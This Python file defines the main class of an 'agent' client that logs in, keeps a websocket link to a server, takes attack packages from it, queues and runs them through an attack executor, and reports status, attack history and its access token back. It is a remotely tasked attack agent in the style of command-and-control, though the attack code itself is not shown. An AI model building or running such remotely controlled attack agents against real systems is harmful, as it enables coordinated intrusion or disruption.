
from pathlib import Path
from threading import Thread
import time
import os
import signal
import sys
from datetime import datetime
import json

from service.log_service import LoggerService
from service.connection_service import ConnectionService
from service.websocket_service import WebSocketClientSevice
from module.attacker_module.attack_executor import AttackExecutor

from module.message_handler.enums.message_type import MessageType
from module.message_handler.message_factory import MessageFactory
from module.message_handler.messages.payloads.agent_info_payload import AgentInformationPayload
from module.message_handler.messages.payloads.agent_init_payload import AgentInitializationPayload
from module.message_handler.messages.payloads.attack_conf_payload import AttackConfirmationPayload

from core.app_data import AppDataManager, AppData

from core.enums.server_request_state import ServerRequestState
from core.enums.app_profile import AppProfile
from core.enums.agent_status import AgentStatus
import core.app_cons as APP_C

from typing import List, TYPE_CHECKING

if TYPE_CHECKING:
    from module.message_handler.messages.base_message import CustomMessage
    from module.attacker_module.attack_executor import Attack

class App:

    _instance = None
    _running: bool = False
    _connection_service: ConnectionService = None
    _attack_executor: AttackExecutor = None
    _websocket_service: WebSocketClientSevice = None
    _status_thread: Thread = None
    _server_status: ServerRequestState = ServerRequestState.CLOSED
    _agent_status: AgentStatus = None

    def __new__(cls, *args, **kwargs):
        if cls._instance is None:
            cls._instance = super().__new__(cls, *args, **kwargs)
            cls._instance._init_services()
        
            cls._instance._init_signal()

        return cls._instance

    def _init_services(self):
        """Initializes services."""
        self._running = False
        self._agent_status = AgentStatus.IDLE
        self._connection_service = ConnectionService(app=self, url=APP_C.REST_BASE_URL)
        self._attack_executor = AttackExecutor(self)
        self._websocket_service = WebSocketClientSevice(self, APP_C.SOCKET_BASE_URL, "/connect-agent")
        self._status_thread = Thread(target=self._status_checker)

    def start(self):
        """Starts the app."""
        self._running = True
        self._attack_executor.start()
        self._status_thread.start()
        self._stuck_to_preceed(ServerRequestState.CLOSED)
        if not AppDataManager.is_cache_exist() or not self._connection_service.validate_agent():
            self._initialise_new()
        self._websocket_service.connect()

    def stop(self):
        """Stops the app."""
        self._attack_executor.stop()
        self._running = False
        self._status_thread.join()
        self._websocket_service.disconnect()

    def run(self):
        """Runs the app."""
        self.start()
        try:
            self._commit()
        finally:
            self.stop()

    def print_app_state(self):
        """Prints the current state of the app and services."""

        print("~~ APP STATE ~~")
        print(f"Running: {self._running}")
        print(f"Server Status: {self._server_status}")
        print(f"Connection Service: {self._connection_service}")
        print(f"Attack Executor: {self._attack_executor}")
        print(f"Status Thread: {self._status_thread}")

    def print_state(self):
        """Prints the current state of the app and services."""
        
        print()
        self.print_app_state()
        self._connection_service.print_state()
        self._attack_executor.print_state()
        print()

    def get_profile(self) -> AppProfile:
        """Gets app current profile"""
        profile = AppProfile.from_string(os.getenv("PROFILE"), raise_error=False)
        if profile is None:
            profile = AppProfile.DEV
        return profile
    
    def send_app_init_data(self):

        custom_message = MessageFactory.create_agent_initialization_message(
            "Agent initializing message",
            AgentInitializationPayload(None, 
                                       AppDataManager.cache.email, 
                                       datetime.now()))
        message = MessageFactory.compose_message(custom_message)
        self._websocket_service.send_message(message)

        self.send_app_info_data()

    def send_app_info_data(self):
        
        if (not self._websocket_service.is_connected): return

        custom_message = MessageFactory.create_agent_information_message(
            "Agent information message",
            AgentInformationPayload(None, 
                                    self._agent_status,
                                    getattr(self._attack_executor.get_current(), 'attack_payload', None),
                                    self._attack_executor.get_queue_len(),
                                    self._connection_service.access_token,
                                    [i.attack_payload for i in self._attack_executor.get_execution_history()]))
        message = MessageFactory.compose_message(custom_message)
        self._websocket_service.send_message(message)

    def handle_message(self, message: "CustomMessage"):

        if (message.message_type == MessageType.ATTACK_PACKAGE):
            self._attack_executor.submit_attack(message)
        else:
            print("Message not comprimised: " + message.message_type.name())

    def confirm_attack(self, attack: "Attack"):
        
        custom_message = MessageFactory.create_attack_confirmation_message(
            "Agent attack confirmation message",
            AttackConfirmationPayload(None,
                                      attack.attack_payload.attack_job_id,
                                      attack.attack_payload.attack_type,
                                      datetime.now()))
        message = MessageFactory.compose_message(custom_message)
        self._websocket_service.send_message(message)

    def _commit(self):
        """Commits the app."""
        
        while True:
            self.print_state()
            time.sleep(APP_C.ONE_COMMIT_CLICK)

        # counter = 1
        # while self._running and counter < 6:

        #     print("-------------------")
        #     print(f"~> STATE COUNTER: {counter}")
        #     self.print_state()
        #     self.send_app_info_data()
        #     time.sleep(APP_C.ONE_COMMIT_CLICK)
        #     counter += 1
        
        # print("~> STOPPING..")
        # self.stop()

    def _initialise_new(self):
        """Initializes a new app."""
        app_data = None
        failed_attempts = 0
        while app_data is None and failed_attempts < 3:
            print("Agent :: Initialising..")
            email, password = self._get_credentials()
            if self._connection_service.validate_agent(email, password):
                app_data = AppData(email, password)
            else:
                print("Invalid Account ~ (Required:Agent)!")
                failed_attempts += 1
        if failed_attempts >= APP_C.MAX_FAILED_ATTEMPTS:
            raise Exception("Failed to validate agent credentials 3 times. Crashing...")
        AppDataManager.set_cache(app_data)

    def _get_credentials(self):
        """Gets the agent credentials."""
        profile = self.get_profile()
        if profile == AppProfile.PRODUCT:
            email = os.getenv("EMAIL")
            password = os.getenv("PASSWORD")
        else:
            email = input("Agent email: ")
            password = input("Agent password: ")
        return email, password

    def _status_checker(self):
        """Checks the server status."""
        while self._running:
            self._server_status = self._connection_service.get_server_status()
            time.sleep(APP_C.STATUS_CHECK_INTERVAL)

    def _stuck_to_preceed(self, *stuck_when: List[ServerRequestState]):
        """Proceeds when not stuck."""
        while self._server_status in stuck_when:
            self._connection_service.print_state()
            time.sleep(APP_C.STUCK_CHECK_INTERVAL)

    def _init_signal(self):
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        print('Signal received, stopping...')
        self.stop()
        sys.exit(0)

    @property
    def running(self):
        """Returns the running status of the app."""
        return self._running

    @property
    def server_status(self):
        """Returns the server status of the app."""
        return self._server_status
    
    @property
    def agent_status(self):
        return self.agent_status

    @agent_status.setter
    def agent_status(self, agent_status: AgentStatus):
        self._agent_status = agent_status
        self.send_app_info_data()

    @classmethod
    def insert_cache(cls):
        pass

    @classmethod
    def check_agent_cache(cls):
        pass

    @classmethod
    def create_agent_cache(cls):
        pass